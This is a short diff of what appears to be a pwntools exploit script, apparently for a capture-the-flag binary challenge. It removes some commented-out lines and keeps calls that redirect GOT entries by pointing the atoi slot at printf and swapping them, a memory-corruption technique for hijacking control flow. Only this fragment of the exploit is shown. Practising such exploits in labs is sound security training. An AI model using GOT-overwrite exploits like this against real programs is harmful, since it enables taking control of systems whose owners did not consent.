@@ -22,12 +22,6 @@ def _exit():
 	r.recvuntil('Your choice:')
 	r.sendline('3')
 
-# printf dl_resolve
-# r.recvuntil('Your choice:')
-# r.sendline('0')
-
-# [ atoi <> printf ] swap
-# setAddr(b.got['atoi'],b.got['printf'])
 setAddr(0x601058,b.got['printf'])
 swap()
 setAddr(0x601058,b.got['atoi'])
